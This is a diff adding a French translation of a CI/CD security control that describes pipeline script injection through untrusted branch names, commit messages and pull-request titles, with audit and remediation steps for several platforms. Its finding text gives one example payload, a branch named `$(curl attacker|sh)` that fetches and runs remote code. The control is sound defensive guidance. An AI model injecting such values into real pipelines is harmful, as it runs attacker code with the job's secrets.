@@ -1,0 +1,80 @@
+# yaml-language-server: $schema=../../../../../schema/control-i18n.schema.json
+id: CB-CICD-PIPE-015
+locale: fr
+source_updated: 2026-11-03
+translators:
+  - name: Alice
+    github: Sn0wAlice
+title: Ne transmettre les valeurs non fiables aux scripts de pipeline que par des variables entre guillemets
+finding:
+  title: Des scripts de pipeline interpolent des valeurs contrôlées par l'attaquant dans des commandes
+  description: Noms de branche, messages de commit, titres de pull request ou texte d'issue sont développés dans une commande shell ou un modèle avant exécution ; une valeur forgée comme une branche nommée `$(curl attacker|sh)` s'exécute alors dans le job avec ses secrets.
+description: |
+  Les valeurs qu'un contributeur ou un utilisateur extérieur peut définir (messages de commit, noms
+  de branche et de tag, titres et descriptions de pull ou merge request, texte d'issue et de
+  commentaire, labels, entrées de workflow de source non fiable, contenu d'artefact) n'atteignent
+  les scripts que sous forme de variables d'environnement utilisées entre guillemets doubles, ou de
+  paramètres typés et validés. Elles ne sont jamais développées par le langage de modèle du pipeline
+  dans le texte du script, jamais passées à `eval`, et jamais écrites dans les fichiers
+  d'environnement ou de chemin du runner (`GITHUB_ENV`, `GITHUB_PATH`) dans les workflows privilégiés.
+
+  Les secrets dans les lignes de commande relèvent de CB-CICD-SEC-023 ; la restriction de la
+  surcharge des variables à l'exécution relève de CB-CICD-PIPE-016.
+rationale: |
+  Le développement du modèle a lieu avant que le shell n'analyse la commande ; les guillemets dans
+  le script n'aident donc pas : le texte de l'attaquant devient du code. Écrire de telles valeurs
+  dans les fichiers d'environnement du runner permet à un attaquant de définir `LD_PRELOAD`,
+  `BASH_ENV` ou `NODE_OPTIONS` et d'exécuter du code dans les étapes suivantes. Passer les valeurs
+  par des variables entre guillemets les garde à l'état de données.
+impact: |
+  Les scripts existants doivent être réécrits pour utiliser des variables d'environnement. La
+  validation des arguments des tâches shell d'Azure DevOps peut casser des tâches qui comptaient sur
+  des métacaractères shell dans leurs arguments.
+audit:
+  manual: |
+    Utiliser un accès en lecture aux fichiers de pipeline. zizmor (`template-injection`,
+    `github-env`), poutine (`injection`) ou Checkov (`CKV_GHA_2`, `CKV_CIRCLECIPIPELINES_6`) peuvent
+    aider.
+
+    1. Rechercher dans les fichiers de pipeline les valeurs non fiables utilisées directement dans
+       des commandes :
+       - **GitHub / Gitea / Forgejo** : `${{ github.event.* }}`, `${{ github.head_ref }}` ou des
+         `inputs.*` non fiables dans `run:` ou dans `script:` d'`actions/github-script` ; écritures
+         dans `$GITHUB_ENV` ou `$GITHUB_PATH` dérivées du contenu d'une pull request, d'une issue ou
+         d'un artefact dans des workflows privilégiés.
+       - **GitLab** : `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
+         `$CI_MERGE_REQUEST_DESCRIPTION`, `$CI_COMMIT_BRANCH` ou
+         `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` utilisés sans guillemets ou dans `eval`.
+       - **Azure DevOps** : syntaxe de macro `$(Build.SourceBranchName)`, `$(Build.SourceBranch)`,
+         `$(Build.SourceVersionMessage)` ou `$(System.PullRequest.SourceBranch)` dans des étapes
+         `script`, `bash`, `pwsh` ou `powershell` ; **Paramètres de l'organisation** > **Pipelines**
+         > **Paramètres** > **Activer la validation des arguments des tâches shell** est activé.
+       - **Jenkins** : des étapes `sh`, `bat`, `powershell` ou `pwsh` utilisent des chaînes Groovy
+         entre guillemets doubles (`"... ${params.X} ..."`) avec des valeurs contrôlées par
+         l'utilisateur ou des identifiants.
+       - **Woodpecker** : `${CI_COMMIT_MESSAGE}`, `${CI_COMMIT_AUTHOR}` ou
+         `${CI_COMMIT_PULL_REQUEST_LABELS}` substitués dans `commands:` au lieu d'être lus depuis
+         l'environnement.
+       - **Buildkite** : des valeurs contrôlées par l'attaquant interpolées lors de
+         `buildkite-agent pipeline upload` au lieu d'être échappées avec `$$` ou téléversées avec
+         l'interpolation désactivée.
+       - **CircleCI** : des valeurs de pipeline non fiables utilisées directement dans des commandes
+         `run:`.
+    2. Échec si une valeur non fiable est développée dans une commande, évaluée, ou écrite dans les
+       fichiers d'environnement ou de chemin du runner dans un workflow privilégié.
+remediation:
+  manual: |
+    1. Placer chaque valeur non fiable dans une variable d'environnement définie par le pipeline
+       (`env:`, `variables:`, `environment:`) et l'utiliser comme `"$VAR"` dans le script.
+    2. Quand la plate-forme offre des entrées typées, déclarer le paramètre avec un type et des
+       valeurs autorisées ou un motif.
+    3. Par plate-forme :
+       - **GitHub** : remplacer `${{ ... }}` dans `run:` par des entrées `env:` ; ne pas écrire de
+         données non fiables dans `$GITHUB_ENV` ou `$GITHUB_PATH`.
+       - **Azure DevOps** : activer **Activer la validation des arguments des tâches shell** au
+         niveau de l'organisation ou du projet et passer les valeurs par `env:`.
+       - **Jenkins** : utiliser des chaînes entre apostrophes (`sh 'echo "$BRANCH"'`) et passer les
+         valeurs par `withEnv` ou des paramètres.
+       - **Buildkite** : échapper les variables d'exécution avec `$$` ou désactiver l'interpolation
+         pour l'upload.
+    4. Ajouter un analyseur de workflows aux contrôles du dépôt de pipeline (CB-CICD-TEST-004).
